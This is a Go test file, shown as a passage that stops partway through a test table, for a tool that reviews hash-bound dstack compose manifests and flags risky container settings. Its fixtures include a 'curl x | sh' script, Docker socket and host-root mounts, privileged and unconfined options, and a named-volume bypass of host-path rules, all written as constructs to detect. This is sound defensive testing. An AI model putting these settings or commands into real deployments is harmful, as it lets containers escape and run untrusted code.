package evidence

import (
	"crypto/sha256"
	"encoding/json"
	"errors"
	"fmt"
	"strings"
	"testing"

	"github.com/0gfoundation/0g-pc-e2ee/protocol/attest"
)

// appComposeFor marshals fields into an app-compose document and returns it with the
// compose_hash a quote would bind — sha256 over THESE bytes.
//
// It marshals once and hashes what it marshalled, rather than hashing a re-encoding:
// the digest is over the file as written, so a test that re-marshalled would be
// testing a preimage no verifier ever sees (the caveat VerifyAppCompose states).
func appComposeFor(t *testing.T, fields map[string]any) ([]byte, [attest.ComposeHashLen]byte) {
	t.Helper()
	raw, err := json.Marshal(fields)
	if err != nil {
		t.Fatalf("marshal app-compose: %v", err)
	}
	return raw, sha256.Sum256(raw)
}

// manifest is the shape most cases below want: a docker-compose runner whose compose
// text is the interesting part.
func manifest(composeText string, extra ...map[string]any) map[string]any {
	m := map[string]any{
		"manifest_version":    2,
		"name":                "broker",
		"runner":              "docker-compose",
		"docker_compose_file": composeText,
	}
	for _, e := range extra {
		for k, v := range e {
			m[k] = v
		}
	}
	return m
}

// reviewOf runs the reviewer over a manifest through the real hash gate.
func reviewOf(t *testing.T, fields map[string]any) ComposeReview {
	t.Helper()
	raw, hash := appComposeFor(t, fields)
	r, err := ReviewCompose(raw, hash)
	if err != nil {
		t.Fatalf("ReviewCompose: %v", err)
	}
	return r
}

// find returns the findings whose key matches and whose service matches (service ""
// matches an app-compose-level finding).
func find(r ComposeReview, service, key string) []Finding {
	var out []Finding
	for _, f := range r.Findings {
		if f.Service == service && f.Key == key {
			out = append(out, f)
		}
	}
	return out
}

// requireFinding asserts exactly one finding for (service, key) at the given severity.
func requireFinding(t *testing.T, r ComposeReview, sev Severity, service, key string) Finding {
	t.Helper()
	got := find(r, service, key)
	if len(got) != 1 {
		t.Fatalf("want exactly 1 finding for service=%q key=%q, got %d\n%s",
			service, key, len(got), dumpFindings(r))
	}
	if got[0].Severity != sev {
		t.Fatalf("finding service=%q key=%q: severity %s, want %s\n%s",
			service, key, got[0].Severity, sev, dumpFindings(r))
	}
	return got[0]
}

func dumpFindings(r ComposeReview) string {
	var b strings.Builder
	for _, f := range r.Findings {
		fmt.Fprintf(&b, "  [%s] %s/%s: %s\n", f.Severity, f.Service, f.Key, f.Detail)
	}
	if b.Len() == 0 {
		return "  (no findings)\n"
	}
	return b.String()
}

// hardened is a manifest that trips nothing. It is the control for every case below:
// without it, a test asserting "privileged is blocking" cannot tell a rule that fires
// on privileged from a rule that fires on everything.
const hardenedCompose = `services:
  broker:
    image: ghcr.io/0gfoundation/broker@sha256:aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
    restart: always
    ports:
      - "3000:3000"
    environment:
      - LOG_LEVEL=info
    volumes:
      - broker-data:/data
volumes:
  broker-data:
`

func hardenedManifest() map[string]any {
	return manifest(hardenedCompose, map[string]any{
		"public_tcbinfo": true,
		"secure_time":    true,
	})
}

// --- the gate ------------------------------------------------------------------

// The hash gate is the only thing that makes any of this meaningful, so it is the
// first thing tested: bytes the quote does not bind must produce no review at all,
// not a review with a warning attached.
func TestReviewCompose_RefusesBytesTheQuoteDoesNotBind(t *testing.T) {
	raw, hash := appComposeFor(t, hardenedManifest())
	hash[0] ^= 0xff

	if _, err := ReviewCompose(raw, hash); err == nil {
		t.Fatal("reviewed an app-compose whose digest does not match the compose_hash")
	}

	// One flipped byte in the manifest is the same failure from the other side: the
	// gate must be over the bytes, not over anything recoverable from them.
	raw2, hash2 := appComposeFor(t, hardenedManifest())
	raw2[len(raw2)-2] = ' '
	if _, err := ReviewCompose(raw2, hash2); err == nil {
		t.Fatal("reviewed an app-compose that was modified after its hash was taken")
	}
}

// A reformatted app-compose is equal JSON with a different digest, and it must fail:
// dstack hashes the file as it wrote it, so accepting a re-encoding would accept a
// document the enclave never booted.
func TestReviewCompose_RefusesReformattedEqualJSON(t *testing.T) {
	raw, hash := appComposeFor(t, hardenedManifest())
	var round map[string]any
	if err := json.Unmarshal(raw, &round); err != nil {
		t.Fatalf("unmarshal: %v", err)
	}
	pretty, err := json.MarshalIndent(round, "", "  ")
	if err != nil {
		t.Fatalf("marshal: %v", err)
	}
	if _, err := ReviewCompose(pretty, hash); err == nil {
		t.Fatal("accepted a reformatted app-compose against the original hash")
	}
}

func TestReviewCompose_RefusesNonJSON(t *testing.T) {
	raw := []byte("not json at all")
	if _, err := ReviewCompose(raw, sha256.Sum256(raw)); err == nil {
		t.Fatal("reviewed bytes that are not JSON")
	}
	// A JSON array passes the "is JSON" bar but is not an app-compose; it must not
	// reach the field walk as an empty object, which would review as clean.
	arr := []byte(`["services"]`)
	if _, err := ReviewCompose(arr, sha256.Sum256(arr)); err == nil {
		t.Fatal("reviewed a JSON array as an app-compose")
	}
}

// --- the control ---------------------------------------------------------------

func TestReviewCompose_HardenedManifestHasNothingBlocking(t *testing.T) {
	r := reviewOf(t, hardenedManifest())
	if n := r.Count(SeverityBlocking); n != 0 {
		t.Fatalf("hardened manifest produced %d blocking finding(s):\n%s", n, dumpFindings(r))
	}
	if n := r.Count(SeverityJustify); n != 0 {
		t.Fatalf("hardened manifest produced %d finding(s) to justify:\n%s", n, dumpFindings(r))
	}
	if len(r.Services) != 1 || r.Services[0].Name != "broker" {
		t.Fatalf("services = %+v, want one named broker", r.Services)
	}
	if !r.Services[0].Pinned() {
		t.Fatalf("broker reads as unpinned: %+v", r.Services[0])
	}
	if r.Services[0].Origin != OriginFirstParty {
		t.Fatalf("origin = %v, want first-party", r.Services[0].Origin)
	}
	if r.Runner != "docker-compose" {
		t.Fatalf("runner = %q", r.Runner)
	}
}

// A manifest that authenticates but embeds no compose text is a finding, not an
// error: the bytes ARE what the quote binds, so the report has something true to say
// about the deployment.
func TestReviewCompose_AuthenticatedManifestWithNoComposeText(t *testing.T) {
	fields := map[string]any{
		"manifest_version": 2,
		"name":             "broker",
		"runner":           "docker-compose",
	}
	r := reviewOf(t, fields)
	f := requireFinding(t, r, SeverityBlocking, "", "docker_compose_file")
	if !strings.Contains(f.Detail, "no compose text") {
		t.Fatalf("detail does not say what is missing: %q", f.Detail)
	}
	if len(r.Services) != 0 {
		t.Fatalf("services = %+v, want none", r.Services)
	}
}

// --- blocking constructs -------------------------------------------------------

func TestReviewCompose_FlagsBlockingServiceConstructs(t *testing.T) {
	pinned := "ghcr.io/0gfoundation/broker@sha256:" + strings.Repeat("a", 64)
	for _, tc := range []struct {
		name    string
		body    string
		key     string
		mustSay string
	}{
		{"privileged", "privileged: true", "privileged", "every capability"},
		{"cap_add", "cap_add:\n      - SYS_ADMIN", "cap_add", "SYS_ADMIN"},
		{"pid host", "pid: host", "pid", "host PID namespace"},
		{"network_mode host", "network_mode: host", "network_mode", "host network namespace"},
		{"cgroup host", "cgroup: host", "cgroup", "host cgroup"},
		{"device_cgroup_rules", "device_cgroup_rules:\n      - 'c 195:* rmw'", "device_cgroup_rules", "cgroup rule"},
		{"volumes_from", "volumes_from:\n      - other", "volumes_from", "wholesale"},
		{"security_opt unconfined", "security_opt:\n      - seccomp:unconfined", "security_opt", "unconfined"},
		{"security_opt label disable", "security_opt:\n      - label:disable", "security_opt", "label:disable"},
		{"docker socket", "volumes:\n      - /var/run/docker.sock:/var/run/docker.sock", "volumes", "complete escape"},
		{"host /etc", "volumes:\n      - /etc:/host-etc:ro", "volumes", "host tree"},
		{"host root", "volumes:\n      - /:/host", "volumes", "host tree"},
	} {
		t.Run(tc.name, func(t *testing.T) {
			doc := fmt.Sprintf("services:\n  broker:\n    image: %s\n    %s\n", pinned, tc.body)
			r := reviewOf(t, manifest(doc))
			f := requireFinding(t, r, SeverityBlocking, "broker", tc.key)
			if !strings.Contains(f.Detail, tc.mustSay) {
				t.Fatalf("detail %q does not mention %q", f.Detail, tc.mustSay)
			}
		})
	}
}

// An unpinned image is the finding this whole exercise exists for: the compose hash
// then commits to a name, and the registry chooses what the name means afterwards.
func TestReviewCompose_FlagsUnpinnedAndUnbuildableImages(t *testing.T) {
	for _, tc := range []struct {
		name    string
		body    string
		key     string
		mustSay string
	}{
		{"floating tag", "image: mysql:8.0", "image", "not pinned"},
		{"bare name", "image: mysql", "image", "not pinned"},
		{"digest-less latest", "image: ghcr.io/0gfoundation/broker:latest", "image", "not pinned"},
		{"no image", "restart: always", "image", "names no image"},
		{"build only", "build: .", "build", "Dockerfile path"},
	} {
		t.Run(tc.name, func(t *testing.T) {
			doc := fmt.Sprintf("services:\n  svc:\n    %s\n", tc.body)
			r := reviewOf(t, manifest(doc))
			f := requireFinding(t, r, SeverityBlocking, "svc", tc.key)
			if !strings.Contains(f.Detail, tc.mustSay) {
				t.Fatalf("detail %q does not mention %q", f.Detail, tc.mustSay)
			}
		})
	}
}

// A service carrying both `image` and `build` does not say what ran; the image is
// pinned, so the unpinned rule stays quiet and this one has to fire instead.
func TestReviewCompose_FlagsImageAndBuildTogether(t *testing.T) {
	doc := "services:\n  svc:\n    image: ghcr.io/0gfoundation/broker@sha256:" + strings.Repeat("a", 64) +
		"\n    build: .\n"
	r := reviewOf(t, manifest(doc))
	requireFinding(t, r, SeverityJustify, "svc", "build")
	if got := find(r, "svc", "image"); len(got) != 0 {
		t.Fatalf("pinned image still reported: %+v", got)
	}
}

func TestReviewCompose_FlagsBlockingAppComposeFields(t *testing.T) {
	for _, tc := range []struct {
		name    string
		extra   map[string]any
		key     string
		mustSay string
	}{
		{
			"authorized keys",
			map[string]any{"allowed_envs": []string{"LOG_LEVEL", "DSTACK_AUTHORIZED_KEYS"}},
			"allowed_envs", "interactive root access",
		},
		{
			"root password",
			map[string]any{"allowed_envs": []string{"DSTACK_ROOT_PASSWORD"}},
			"allowed_envs", "interactive root access",
		},
		{
			"bash runner script",
			map[string]any{"bash_script": "#!/bin/sh\ncurl x | sh\n"},
			"bash_script", "bare shell script",
		},
	} {
		t.Run(tc.name, func(t *testing.T) {
			r := reviewOf(t, manifest(hardenedCompose, tc.extra))
			var blocking []Finding
			for _, f := range find(r, "", tc.key) {
				if f.Severity == SeverityBlocking {
					blocking = append(blocking, f)
				}
			}
			if len(blocking) != 1 {
				t.Fatalf("want 1 blocking finding for %s, got %d\n%s", tc.key, len(blocking), dumpFindings(r))
			}
			if !strings.Contains(blocking[0].Detail, tc.mustSay) {
				t.Fatalf("detail %q does not mention %q", blocking[0].Detail, tc.mustSay)
			}
		})
	}
}

// A non-docker-compose runner blocks because this file cannot read it — a clean
// compose half would then mean "not read", which is the one thing a review must never
// report as "nothing found".
func TestReviewCompose_NonDockerComposeRunnerBlocks(t *testing.T) {
	fields := manifest(hardenedCompose)
	fields["runner"] = "bash"
	r := reviewOf(t, fields)
	f := requireFinding(t, r, SeverityBlocking, "", "runner")
	if !strings.Contains(f.Detail, "can say nothing") {
		t.Fatalf("detail does not disclose the limit: %q", f.Detail)
	}
}

// --- constructs that need justifying ------------------------------------------

func TestReviewCompose_FlagsServiceConstructsToJustify(t *testing.T) {
	pinned := "ghcr.io/0gfoundation/broker@sha256:" + strings.Repeat("a", 64)
	for _, tc := range []struct {
		name    string
		body    string
		key     string
		mustSay string
	}{
		{"ipc host", "ipc: host", "ipc", "shared memory"},
		{"ipc shareable", "ipc: shareable", "ipc", "shared memory"},
		{"guest agent socket", "volumes:\n      - /var/run/dstack.sock:/var/run/dstack.sock", "volumes", "app's keys"},
		{"tappd socket", "volumes:\n      - /var/run/tappd.sock:/var/run/tappd.sock", "volumes", "app's keys"},
		{"devices", "devices:\n      - /dev/nvidia0:/dev/nvidia0", "devices", "GPU work needs this"},
		{"dev shm", "volumes:\n      - /dev/shm:/dev/shm", "volumes", "shared memory"},
		{"sysctls", "sysctls:\n      net.core.somaxconn: 1024", "sysctls", "kernel parameters"},
		{"group_add", "group_add:\n      - '44'", "group_add", "extra groups"},
		{"uts host", "uts: host", "uts", "UTS namespace"},
		{"userns host", "userns_mode: host", "userns_mode", "user-namespace remapping"},
		{"cgroup_parent", "cgroup_parent: /custom", "cgroup_parent", "outside the tree"},
		{"pid container", "pid: 'container:other'", "pid", "PID namespace"},
		{"network container", "network_mode: 'container:other'", "network_mode", "network namespace"},
		{"secrets", "secrets:\n      - db_password", "secrets", "outside its image"},
	} {
		t.Run(tc.name, func(t *testing.T) {
			doc := fmt.Sprintf("services:\n  broker:\n    image: %s\n    %s\n", pinned, tc.body)
			r := reviewOf(t, manifest(doc))
			f := requireFinding(t, r, SeverityJustify, "broker", tc.key)
			if !strings.Contains(f.Detail, tc.mustSay) {
				t.Fatalf("detail %q does not mention %q", f.Detail, tc.mustSay)
			}
			if n := r.Count(SeverityBlocking); n != 0 {
				t.Fatalf("%s produced %d blocking finding(s), want 0:\n%s", tc.name, n, dumpFindings(r))
			}
		})
	}
}

// A YAML merge key hides the keys that actually apply to the service, so the review
// cannot describe it — and must say so rather than reporting a vague "no rule for this
// key". Without this, `privileged: true` in an anchor comes out as a Justify note.
func TestReviewCompose_MergeKeyHidesTheServiceBody(t *testing.T) {
	pinned := "ghcr.io/0gfoundation/broker@sha256:" + strings.Repeat("a", 64)
	doc := fmt.Sprintf(`x-base: &base
  privileged: true
services:
  broker:
    <<: *base
    image: %s
`, pinned)
	r := reviewOf(t, manifest(doc))
	f := requireFinding(t, r, SeverityBlocking, "broker", "<<")
	if !strings.Contains(f.Detail, "cannot describe the service") {
		t.Fatalf("detail %q does not say the review is blind here", f.Detail)
	}
}

// A relative bind resolves against the deployment directory, which the manifest does
// not record. Treating it as a named volume would silently exempt it from every host-path
// rule — including "../../../etc".
func TestReviewCompose_RelativeBindsCannotBeResolved(t *testing.T) {
	pinned := "ghcr.io/0gfoundation/broker@sha256:" + strings.Repeat("a", 64)
	for _, src := range []string{"./data", "../state", "~/keys", "sub/../../etc"} {
		t.Run(src, func(t *testing.T) {
			doc := fmt.Sprintf("services:\n  broker:\n    image: %s\n    volumes:\n      - %s:/x\n", pinned, src)
			f := requireFinding(t, reviewOf(t, manifest(doc)), SeverityJustify, "broker", "volumes")
			if !strings.Contains(f.Detail, "RELATIVE bind mount") {
				t.Fatalf("detail %q does not report it as unresolvable", f.Detail)
			}
		})
	}
	// A DECLARED named volume is not a relative bind and must stay quiet.
	doc := fmt.Sprintf("services:\n  broker:\n    image: %s\n    volumes:\n      - state:/x\nvolumes:\n  state:\n", pinned)
	if got := find(reviewOf(t, manifest(doc)), "broker", "volumes"); len(got) != 0 {
		t.Fatalf("a declared named volume was reported: %+v", got)
	}
}

// A rule that fires on the KEY rather than on its contents reports something an
// operator cannot act on, and teaches them to skim the line.
func TestReviewCompose_EmptyValuesAreNotFindings(t *testing.T) {
	pinned := "ghcr.io/0gfoundation/broker@sha256:" + strings.Repeat("a", 64)
	for _, tc := range []struct{ name, body, key string }{
		{"sysctls", "sysctls: {}", "sysctls"},
		{"empty security_opt", "security_opt: []", "security_opt"},
		{"extra_hosts", "extra_hosts: []", "extra_hosts"},
		{"dns", "dns:", "dns"},
		{"secrets", "secrets: []", "secrets"},
		{"links", "links: []", "links"},
		{"cap_add", "cap_add: []", "cap_add"},
		{"devices", "devices: []", "devices"},
		{"group_add", "group_add: []", "group_add"},
		{"volumes", "volumes: []", "volumes"},
		{"device_cgroup_rules", "device_cgroup_rules: []", "device_cgroup_rules"},
		{"volumes_from", "volumes_from: []", "volumes_from"},
		// An explicit null is compose's empty list, not an unreadable value. `volumes_from:`
		// with nothing after it used to report Blocking, asserting the service had taken
		// another container's mounts.
		{"null cap_add", "cap_add:", "cap_add"},
		{"null devices", "devices:", "devices"},
		{"null group_add", "group_add:", "group_add"},
		{"null volumes_from", "volumes_from:", "volumes_from"},
		{"null device_cgroup_rules", "device_cgroup_rules:", "device_cgroup_rules"},
		{"null security_opt", "security_opt:", "security_opt"},
	} {
		t.Run(tc.name, func(t *testing.T) {
			doc := fmt.Sprintf("services:\n  broker:\n    image: %s\n    %s\n", pinned, tc.body)
			if got := find(reviewOf(t, manifest(doc)), "broker", tc.key); len(got) != 0 {
				t.Fatalf("an empty %s was reported: %+v", tc.key, got)
			}
		})
	}
}

// An absent runner is the same limit as an unreadable one: the platform may have a
// default, and guessing which would be this review inventing the fact it reports.
func TestReviewCompose_AbsentRunnerBlocks(t *testing.T) {
	fields := manifest(hardenedCompose)
	delete(fields, "runner")
	f := requireFinding(t, reviewOf(t, fields), SeverityBlocking, "", "runner")
	if !strings.Contains(f.Detail, "not set") {
		t.Fatalf("detail %q does not say the field is missing", f.Detail)
	}
}

// A mount two services hold is a channel neither service's image digest, ports or
// environment mentions. It has to be reported ONCE, at the manifest level, naming
// both holders — a per-service finding would say "this is shared" twice without ever
// saying with whom.
func TestReviewCompose_ReportsMountsHeldByTwoServices(t *testing.T) {
	pinned := "ghcr.io/0gfoundation/broker@sha256:" + strings.Repeat("a", 64)
	doc := fmt.Sprintf(`services:
  a:
    image: %s
    volumes:
      - zg-tee:/var/lib/zg
  b:
    image: %s
    volumes:
      - zg-tee:/var/lib/zg
  c:
    image: %s
    volumes:
      - own:/var/lib/own
volumes:
  zg-tee:
  own:
`, pinned, pinned, pinned)
	r := reviewOf(t, manifest(doc))
	f := requireFinding(t, r, SeverityJustify, "", "volumes")
	for _, want := range []string{"zg-tee", "a", "b"} {
		if !strings.Contains(f.Detail, want) {
			t.Fatalf("detail %q does not name %q", f.Detail, want)
		}
	}
	if strings.Contains(f.Detail, "own") {
		t.Fatalf("a volume held by one service was reported as shared: %q", f.Detail)
	}
}

func TestReviewCompose_FlagsAppComposeFieldsToJustify(t *testing.T) {
	for _, tc := range []struct {
		name    string
		extra   map[string]any
		key     string
		mustSay string
	}{
		{"kms", map[string]any{"kms_enabled": true, "key_provider": "kms", "key_provider_id": "abc"}, "kms_enabled", "cannot be read from the quote"},
		{"public logs", map[string]any{"public_logs": true}, "public_logs", "is disclosed"},
		{"pre-launch script", map[string]any{"pre_launch_script": "#!/bin/bash\necho hi\n"}, "pre_launch_script", "covered by no image digest"},
		{"host api", map[string]any{"host_api_enabled": true}, "host_api_enabled", "does not read"},
	} {
		t.Run(tc.name, func(t *testing.T) {
			r := reviewOf(t, manifest(hardenedCompose, tc.extra))
			f := requireFinding(t, r, SeverityJustify, "", tc.key)
			if !strings.Contains(f.Detail, tc.mustSay) {
				t.Fatalf("detail %q does not mention %q", f.Detail, tc.mustSay)
			}
		})
	}
}

// The pre-launch script is TCB no image digest covers, so the review has to give a
// reviewer something comparable across providers: its size and its digest.
func TestReviewCompose_DigestsThePreLaunchScript(t *testing.T) {
	const script = "#!/bin/bash\nset -e\necho boot\n"
	r := reviewOf(t, manifest(hardenedCompose, map[string]any{"pre_launch_script": script}))
	if r.PreLaunchBytes != len(script) {
		t.Fatalf("PreLaunchBytes = %d, want %d", r.PreLaunchBytes, len(script))
	}
	want := fmt.Sprintf("%x", sha256.Sum256([]byte(script)))
	if r.PreLaunchSHA256 != want {
		t.Fatalf("PreLaunchSHA256 = %s, want %s", r.PreLaunchSHA256, want)
	}
	if !strings.Contains(requireFinding(t, r, SeverityJustify, "", "pre_launch_script").Detail, want) {
		t.Fatal("the finding does not carry the digest a reviewer would compare")
	}
}

// --- staying honest as the manifest grows -------------------------------------

// The failure this guards against is the one that already happened once in this
// project's tooling: a checker with a fixed field list that reports "nothing found"
// about fields it never looked at.
func TestReviewCompose_ReportsFieldsAndKeysItHasNoRuleFor(t *testing.T) {
	t.Run("app-compose field", func(t *testing.T) {
		r := reviewOf(t, manifest(hardenedCompose, map[string]any{"some_future_switch": true}))
		f := requireFinding(t, r, SeverityJustify, "", "some_future_switch")
		if !strings.Contains(f.Detail, "no rule") {
			t.Fatalf("detail %q does not say the field was not understood", f.Detail)
		}
	})
	t.Run("service key", func(t *testing.T) {
		doc := "services:\n  broker:\n    image: ghcr.io/0gfoundation/broker@sha256:" +
			strings.Repeat("a", 64) + "\n    some_future_key: yes\n"
		r := reviewOf(t, manifest(doc))
		f := requireFinding(t, r, SeverityJustify, "broker", "some_future_key")
		if !strings.Contains(f.Detail, "no rule") {
			t.Fatalf("detail %q does not say the key was not understood", f.Detail)
		}
	})
	// An empty docker_config is not a private registry, and must not be reported as one.
	t.Run("empty docker_config stays quiet", func(t *testing.T) {
		for _, v := range []any{nil, map[string]any{}} {
			r := reviewOf(t, manifest(hardenedCompose, map[string]any{"docker_config": v}))
			if got := find(r, "", "docker_config"); len(got) != 0 {
				t.Fatalf("docker_config=%v reported: %+v", v, got)
			}
		}
		r := reviewOf(t, manifest(hardenedCompose, map[string]any{
			"docker_config": map[string]any{"registry": "private.example.com"},
		}))
		requireFinding(t, r, SeverityNote, "", "docker_config")
	})

	t.Run("known fields and x- extensions stay quiet", func(t *testing.T) {
		doc := "services:\n  broker:\n    image: ghcr.io/0gfoundation/broker@sha256:" +
			strings.Repeat("a", 64) + "\n    x-my-note: whatever\n    restart: always\n"
		r := reviewOf(t, manifest(doc, map[string]any{"features": []string{"kms"}, "storage_fs": "zfs"}))
		if n := r.Count(SeverityJustify); n != 0 {
			t.Fatalf("recognised input produced %d finding(s) to justify:\n%s", n, dumpFindings(r))
		}
	})
}

// Fields is the manifest's whole surface, which is not the same as the part this file
// has rules for. A report prints both so the gap between them is visible.
func TestReviewCompose_ListsEveryTopLevelField(t *testing.T) {
	r := reviewOf(t, manifest(hardenedCompose, map[string]any{
		"kms_enabled": true, "storage_fs": "zfs", "zzz_unknown": 1,
	}))
	want := []string{
		"docker_compose_file", "kms_enabled", "manifest_version", "name",
		"runner", "storage_fs", "zzz_unknown",
	}
	if strings.Join(r.Fields, ",") != strings.Join(want, ",") {
		t.Fatalf("Fields = %v, want %v (sorted, every key)", r.Fields, want)
	}
}

// A value in a shape the rule cannot read must NOT come back as "not set". A rule
// that defaults to safe on an unparseable value produces a clean line, which is worse
// than having no rule at all.
func TestReviewCompose_UnreadableValueIsNotReadAsAbsent(t *testing.T) {
	pinned := "ghcr.io/0gfoundation/broker@sha256:" + strings.Repeat("a", 64)
	for _, tc := range []struct {
		name string
		body string
		sev  Severity
		key  string
	}{
		{"privileged is not a bool", "privileged: sort-of", SeverityBlocking, "privileged"},
		{"cap_add is a scalar", "cap_add: SYS_ADMIN", SeverityBlocking, "cap_add"},
		{"cap_add is a mapping", "cap_add:\n      a: b", SeverityBlocking, "cap_add"},
		{"cap_add holds a mapping", "cap_add:\n      - a: b", SeverityBlocking, "cap_add"},
		{"security_opt is a scalar", "security_opt: seccomp:unconfined", SeverityBlocking, "security_opt"},
		{"volumes_from is a scalar", "volumes_from: other", SeverityBlocking, "volumes_from"},
		{"device_cgroup_rules is a scalar", "device_cgroup_rules: 'c 1:1 rmw'", SeverityBlocking, "device_cgroup_rules"},
		{"devices is a scalar", "devices: /dev/nvidia0", SeverityJustify, "devices"},
		{"volumes is a scalar", "volumes: /data", SeverityJustify, "volumes"},
		{"volumes entry is nested", "volumes:\n      - - /a\n        - /b", SeverityJustify, "volumes"},
		{"group_add is a scalar", "group_add: '44'", SeverityJustify, "group_add"},
	} {
		t.Run(tc.name, func(t *testing.T) {
			doc := fmt.Sprintf("services:\n  broker:\n    image: %s\n    %s\n", pinned, tc.body)
			r := reviewOf(t, manifest(doc))
			requireFinding(t, r, tc.sev, "broker", tc.key)
		})
	}

	// A `privileged: false` really is absent, and must stay quiet — otherwise the rule
	// above is just "the key is present", and an operator clears it by deleting a line
	// that says the safe thing.
	doc := fmt.Sprintf("services:\n  broker:\n    image: %s\n    privileged: false\n", pinned)
	if got := find(reviewOf(t, manifest(doc)), "broker", "privileged"); len(got) != 0 {
		t.Fatalf("privileged: false was reported: %+v", got)
	}
}

// An unreadable value must produce a finding that says SO — never the rule's own
// sentence, which asserts the construct is there. `volumes_from:` reported "the service
// takes another container's mounts wholesale" about a key with nothing after it, which
// is a fabricated fact rather than a conservative one; and a reviewer who checks it and
// finds nothing learns to distrust the whole blocking list.
//
// Written as one sweep over every list-shaped rule rather than per case, because the
// bug was a copy-paste pattern (`!ok || len(x) > 0`) that three rules shared while the
// rule twenty lines above them did it correctly.
func TestReviewCompose_UnreadableValueNeverAssertsTheConstructExists(t *testing.T) {
	pinned := "ghcr.io/0gfoundation/broker@sha256:" + strings.Repeat("a", 64)
	// For each key: a value of the wrong shape, and a phrase from the rule's real
	// sentence that must NOT appear when nothing could be read.
	for _, tc := range []struct{ key, badValue, mustNotSay string }{
		{"cap_add", "SYS_ADMIN", "beyond the default set"},
		{"device_cgroup_rules", "'c 195:* rmw'", "grants itself device access"},
		{"volumes_from", "other", "mounts wholesale"},
		{"group_add", "'44'", "joins extra groups"},
		{"devices", "/dev/nvidia0", "GPU work needs this"},
		{"security_opt", "seccomp:unconfined", "switches off a confinement"},
	} {
		t.Run(tc.key, func(t *testing.T) {
			doc := fmt.Sprintf("services:\n  broker:\n    image: %s\n    %s: %s\n", pinned, tc.key, tc.badValue)
			got := find(reviewOf(t, manifest(doc)), "broker", tc.key)
			if len(got) != 1 {
				t.Fatalf("want 1 finding for an unreadable %s, got %d", tc.key, len(got))
			}
			if !strings.Contains(got[0].Detail, "could not be read") {
				t.Errorf("%s: detail does not say the value was unreadable: %q", tc.key, got[0].Detail)
			}
			if strings.Contains(got[0].Detail, tc.mustNotSay) {
				t.Errorf("%s: an unreadable value asserts the construct exists (%q): %q",
					tc.key, tc.mustNotSay, got[0].Detail)
			}
		})
	}
}

// A rule that fires on a real value should name it: "adds SYS_ADMIN" is actionable,
// "adds capabilities" sends the reader back to the manifest.
func TestReviewCompose_FindingsNameTheValueTheyFireOn(t *testing.T) {
	pinned := "ghcr.io/0gfoundation/broker@sha256:" + strings.Repeat("a", 64)
	for _, tc := range []struct{ body, key, mustSay string }{
		{"cap_add:\n      - SYS_ADMIN", "cap_add", "SYS_ADMIN"},
		{"device_cgroup_rules:\n      - c 195:* rmw", "device_cgroup_rules", "c 195:* rmw"},
		{"volumes_from:\n      - sidecar", "volumes_from", "sidecar"},
		{"group_add:\n      - '44'", "group_add", "44"},
		{"devices:\n      - /dev/nvidia0:/dev/nvidia0", "devices", "/dev/nvidia0"},
	} {
		t.Run(tc.key, func(t *testing.T) {
			doc := fmt.Sprintf("services:\n  broker:\n    image: %s\n    %s\n", pinned, tc.body)
			got := find(reviewOf(t, manifest(doc)), "broker", tc.key)
			if len(got) != 1 {
				t.Fatalf("want 1 finding for %s, got %d", tc.key, len(got))
			}
			if !strings.Contains(got[0].Detail, tc.mustSay) {
				t.Errorf("%s: detail does not name %q: %q", tc.key, tc.mustSay, got[0].Detail)
			}
		})
	}
}

// Authenticated bytes that are not a readable compose file are a fact about the
// deployment, so they belong in the report rather than in an error return.
func TestReviewCompose_UnreadableComposeTextIsAFinding(t *testing.T) {
	for _, tc := range []struct {
		name string
		text string
	}{
		{"not yaml", "services: [unclosed\n"},
		{"no services mapping", "version: '3'\nnetworks:\n  default:\n"},
		{"services is a list", "services:\n  - broker\n"},
	} {
		t.Run(tc.name, func(t *testing.T) {
			r := reviewOf(t, manifest(tc.text))
			requireFinding(t, r, SeverityBlocking, "", "docker_compose_file")
		})
	}
}

func TestReviewCompose_ServiceBodyThatIsNotAMapping(t *testing.T) {
	r := reviewOf(t, manifest("services:\n  broker: notamapping\n"))
	requireFinding(t, r, SeverityBlocking, "broker", "")
	if len(r.Services) != 1 || r.Services[0].Name != "broker" {
		t.Fatalf("the service was dropped rather than reported: %+v", r.Services)
	}
}

// --- the top level, which is the layer that can undo the rules below it --------

// The bypass: a host bind wearing a volume name. `- etcbind:/host-etc` over a volume
// whose driver_opts.device is /etc reads exactly like `- /etc:/host-etc`, and a review
// that walked only `services:` called the first one clean. Asserted as EQUIVALENCE
// rather than "reports something", so the indirect form cannot drift to a softer rule.
func TestReviewCompose_NamedVolumeBindingAHostPathIsTheSameFinding(t *testing.T) {
	pinned := "ghcr.io/0gfoundation/broker@sha256:" + strings.Repeat("a", 64)
	direct := fmt.Sprintf("services:\n  a:\n    image: %s\n    volumes:\n      - /etc:/host-etc\n", pinned)
	indirect := fmt.Sprintf(`services:
  a:
    image: %s
    volumes:
      - etcbind:/host-etc
volumes:
  etcbind:
    driver: local
    driver_opts:
      type: none
      device: /etc
      o: bind
`, pinned)

	want := requireFinding(t, reviewOf(t, manifest(direct)), SeverityBlocking, "a", "volumes")
	got := requireFinding(t, reviewOf(t, manifest(indirect)), SeverityBlocking, "a", "volumes")
	if !strings.Contains(got.Detail, "a host tree the CVM's own OS owns") {
		t.Fatalf("the indirect form does not reach the host-tree rule:\n  got  %q\n  want it to say what %q says",
			got.Detail, want.Detail)
	}
	// And it has to name the indirection, or nobody can find the line to edit.
	for _, s := range []string{"/etc", "compose.volumes.etcbind", "driver_opts.device"} {
		if !strings.Contains(got.Detail, s) {
			t.Errorf("detail does not name %q: %q", s, got.Detail)
		}
	}
}

func TestReviewCompose_TopLevelSections(t *testing.T) {
	pinned := "ghcr.io/0gfoundation/broker@sha256:" + strings.Repeat("a", 64)
	svc := fmt.Sprintf("services:\n  a:\n    image: %s\n", pinned)
	for _, tc := range []struct {
		name    string
		doc     string
		sev     Severity
		key     string
		mustSay string
	}{
		{
			"unknown top-level key", svc + "some_future_section:\n  a: b\n",
			SeverityJustify, "compose.some_future_section", "no rule for the top-level compose key",
		},
		{
			"include pulls in an unmeasured file", svc + "include:\n  - ../other/compose.yml\n",
			SeverityBlocking, "compose.include", "does not commit to it",
		},
		{
			"external volume", svc + "volumes:\n  state:\n    external: true\n",
			SeverityJustify, "compose.volumes.state", "already existed on the host",
		},
		{
			"network filesystem volume",
			svc + "volumes:\n  models:\n    driver: local\n    driver_opts:\n      type: nfs\n      o: addr=10.0.0.1\n      device: \":/export/models\"\n",
			SeverityBlocking, "compose.volumes.models", "off the network",
		},
		{
			"unknown volume key", svc + "volumes:\n  state:\n    some_future_key: 1\n",
